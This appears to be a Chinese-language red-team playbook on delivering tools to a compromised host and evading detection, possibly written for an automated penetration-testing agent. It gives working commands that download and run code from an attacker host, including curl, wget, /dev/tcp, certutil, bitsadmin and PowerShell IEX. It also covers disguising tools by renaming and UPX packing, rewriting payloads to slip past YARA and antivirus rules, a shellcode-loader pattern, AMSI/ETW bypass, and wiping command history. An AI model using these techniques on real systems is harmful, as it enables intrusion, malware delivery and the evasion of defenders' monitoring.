# 工具投递与规避

> 适用：已有 shell/webshell/RCE，需要把 fscan、frpc、chisel、linpeas、winPEAS 等送到目标执行，或现有工具/载荷被杀软与检测规则拦下时。

## 认什么

- **投递通道**：目标有 wget/curl/python/nc 吗？只 80/443 出网吗？完全不出网吗？有 SSH 凭据吗？能写 Web 目录吗？
- **平台与架构**：`uname -m`（x86_64→amd64，aarch64→arm64）、`echo %PROCESSOR_ARCHITECTURE%`（AMD64）。下载错架构等于白干。
- **执行约束**：`/tmp` 是否 `noexec`；磁盘是否只读；命令长度是否受限（webshell/RCE 参数上限）。
- **检测面**：下载即被拦、`certutil` 告警、PowerShell 被 AMSI 拦、二进制落地即被删——是"通道问题"还是"文件特征问题"，处置完全不同。
- **本地跑还是目标上跑**：内网扫描/爆破类几乎总该传到目标执行，见下表。

| 因素 | 经隧道本地执行 | 目标上直接执行 |
|---|---|---|
| 网络/带宽 | 全部流量走隧道，受带宽延迟双重限制 | 目标直接发包，内网直连 |
| ICMP/UDP | SOCKS 通常不支持 | 正常可用，存活探测准 |
| 稳定性 | 隧道断＝扫描中断 | 不依赖隧道 |
| 隐蔽性 | 大量数据过单一隧道，模式异常 | 更像正常内网通信 |
| 风险 | 无落地风险 | 二进制可能被 AV 检出 |

只有轻量单次请求（curl 一下、查个 DNS）才适合经隧道在本地做。

## 打哪（命令）

### 0. 备好投递物

攻击机建 arsenal 目录，按工具分子目录放各平台版本（fscan/、gogo/、zombie/、spray/、cdk/、iox/、frpc/、chisel/），每目录带 `linux_amd64`、`linux_arm64`、`windows_amd64.exe`。投递前开 HTTP：

```bash
export ARSENAL=~/arsenal
python3 -m http.server 8888 --directory $ARSENAL/fscan/
```

### 1. Linux 传输（按可用性排序）

```bash
# HTTP 下载（首选）
wget http://ATTACKER:8888/fscan -O /tmp/fscan && chmod +x /tmp/fscan
curl -sO http://ATTACKER:8888/fscan && chmod +x fscan
# 无 wget/curl，有 python
python3 -c "import urllib.request; urllib.request.urlretrieve('http://ATTACKER:8888/fscan','/tmp/fscan')"
# 无 HTTP：nc 收发
nc -lvp 4444 < fscan        # 攻击机
nc ATTACKER 4444 > /tmp/fscan   # 目标
# 极简环境（busybox/容器）用 bash 内建
cat < /dev/tcp/ATTACKER/4444 > /tmp/fscan
# 完全不出网：base64 分块经 RCE 写入
base64 -w0 fscan > fscan.b64 && split -b 50000 fscan.b64 chunk_
# 目标侧 echo 'CHUNK' >> /tmp/.b 逐块写；base64 -d /tmp/.b > /tmp/.s
md5sum /tmp/.s            # 必须比对
# 有 SSH 凭据
scp -o ProxyJump=user@JUMP fscan user@TARGET:/tmp/fscan
```

### 2. Windows 传输

```cmd
certutil -urlcache -split -f http://ATTACKER:8888/tool.exe C:\Windows\Temp\tool.exe
bitsadmin /transfer job /download /priority high http://ATTACKER:8888/tool.exe C:\Windows\Temp\tool.exe
copy \\ATTACKER\share\tool.exe C:\Windows\Temp\tool.exe
```

```powershell
Invoke-WebRequest -Uri http://ATTACKER:8888/tool.exe -OutFile C:\Windows\Temp\tool.exe
(New-Object Net.WebClient).DownloadFile('http://ATTACKER:8888/tool.exe','C:\Windows\Temp\tool.exe')
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER:8888/script.ps1')
```

SMB 投递在内网最自然：攻击机 `python3 smbserver.py share /path/to/tools -smb2support`，目标直接 `\\ATTACKER\share\tool.exe` 执行（不落地，规避文件监控）。base64 走 PowerShell `[Convert]::FromBase64String` 落文件适合无网络通道时；FTP 用 `python3 -m pyftpdlib -p 21` + `ftp -s:commands.txt`。

### 3. 不出网 / 容器环境

先建隧道（`internal-06`）再走 HTTP；只能命令执行时用 base64 分块。K8s/Docker 内：`kubectl cp` / `docker cp`；容器内优先 `/dev/shm`（内存文件系统）。

### 4. 落地与执行（少写盘、快清理）

- Linux：`/dev/shm`、`/tmp`、`/var/tmp`；别用原始工具名（fscan → `svc_check`）；`./tool args; rm -f tool`；有条件用 `/proc/self/fd/` 无文件加载。
- Windows：`C:\Windows\Temp`、`C:\ProgramData`、用户 Temp；改名（`mimikatz.exe` → `svc_diag.exe`）；`upx -9 tool.exe` 改 hash；`timestomp` 改时间；优先 SMB 远程执行/`IEX` 内存加载，不落盘。
- 投递后必做：`md5sum`/哈希比对、`chmod +x`、`file` 或直接小参数试跑，确认不是 HTML 错误页。

### 5. 被拦后的规避（先诊断，再改）

工具/载荷被 YARA、Sigma、Snort 或杀软命中时，按固定流程，不要瞎改：

```
1. 识别组件：implant/beacon/agent 目录、语言（C/Go/Rust/Python）、架构
2. 搜规则：YARA（VirusTotal/GitHub/Elastic/ESET）、Sigma（日志行为）、
   Snort/Suricata/Zeek（网络特征）
3. 逐规则拆 pattern，回源码定位：函数序言/字符串字节/API 调用序列/配置结构体
4. 改法优先级：编译器标志 > 构建配置 > 源码修改 > 重构
   编译标志：-O2、-fomit-frame-pointer、-fno-ident、-fno-stack-protector（最低成本）
   字符串：XOR 加密、栈上拼接；函数改名；Makefile/CMakeLists/Cargo.toml 一并改
5. grep 确认所有 pattern 已消除，重新编译验证；输出 modifications_summary
```

Loader 侧按四组件组合：`Storage × Allocator × Copier × Executor`（存储：内嵌/资源段/远程 URL/注册表/ADS；分配：VirtualAlloc/HeapCreate/NtAllocateVirtualMemory；复制：memcpy/RtlMoveMemory/WriteProcessMemory；执行：函数指针/CreateThread/EnumWindows 回调/APC/Fiber/NtCreateThreadEx）。C/C++/Rust 编译：

```bash
x86_64-w64-mingw32-gcc -o loader.exe loader.c
cargo build --release --target x86_64-pc-windows-gnu
```

七类技术按需叠加：api_obfuscation（API hashing/IAT 混淆）、string_obfuscation（XOR）、memory_evasion（RW→RX 权限翻转，别一步 RWX）、execution_evasion（直接/间接 syscall）、anti_analysis（反调试/沙箱检测）、amsi_etw_bypass（AmsiScanBuffer/EtwEventWrite patch）、unhooking（NTDLL 重映射）。权限翻转最小改法：

```c
LPVOID a = VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_READWRITE);
memcpy(a, sc, size);
VirtualProtect(a, size, PAGE_EXECUTE_READ, &old);
```

知识库里没有合适技术时，先 `gh search repos "shellcode loader language:C stars:>20"`、`gh search repos "AMSI bypass"`、`gh search code "NtCreateThreadEx" --language c` 找现成实现，分析后入库；只在当前评估需要的范围内用，不堆未验证组件。

### 6. 痕迹清理

```bash
rm -f /tmp/fscan /tmp/result.txt      # Linux；/dev/shm 重启自清
history -c && unset HISTFILE
sed -i '/fscan/d' ~/.bash_history
```

```powershell
Remove-Item (Get-PSReadlineOption).HistorySavePath
del /f C:\Windows\Temp\tool.exe
```

日志已实时转发到 SIEM 时，本地删历史基本无效——重点回到"少落地、少执行、操作时间窗"。清理策略细节见 `internal-08`。

## 什么算成

- 工具在目标**真实执行并产出结果**：fscan 扫出内网存活/端口/弱口令、frpc/chisel 回连成功、linpeas/winPEAS 给出可验证的提权线索、会话上线并能执行命令。
- 文件完整性可验证：本地与目标 `md5sum`/hash 一致；`file` 显示正确平台格式。
- 不落地执行成功（`\\ATTACKER\share\tool.exe` 跑通）；或被杀软拦下后换通道（certutil→bitsadmin/SMB、落地→内存、原二进制→换 loader）**成功**，且保留被拦的否定证据。
- 规避改动的验证：grep 确认命中 pattern 消除、交叉编译通过、目标上功能正常（三者缺一不算成）。

## 假点

- 下载到 0 字节、HTML 错误页、重定向页，就当二进制；`exec format error` 是架构/平台选错。
- `certutil` 被拦就停，不试 bitsadmin/SMB/PowerShell 内存加载。
- 上传成功但目录 `noexec`、无执行权限，或 SELinux/AppArmor 拦 exec。
- 内存加载了但没验证回连/回显，就写"已上线"。
- `upx` 只改了 hash，行为/字符串没变，仍被杀；或只做编译通过、没在目标环境验证。
- 清理了本地历史就写"无痕"——SIEM 已收走，本地删除无效。
- 免杀用了知识库外的"自创"技术或未经验证的 payload；只编译不测等于没做。

## 与其他包联动

- 通道：`internal-06`（隧道）；目标选型：`internal-07`（linpeas/winPEAS）、`internal-05`（横向工具）、`internal-09`（基础设施专用工具）。
- Web 上传口被过滤 → `web-waf-bypass`；K8s/容器内投递 → `cloud-infra`；CVE/PoC 与字典 → `../../../../kb/`（`../../../../rules/55-kb-usage.md`）。
- 落地遵循 `../../../../rules/20-min-harm.md`：只投必要工具、优先内存/临时目录、执行后清理、不破坏业务；执行记录与 hash 作为证据按 `../../../../rules/40-evidence-report.md` 交付。
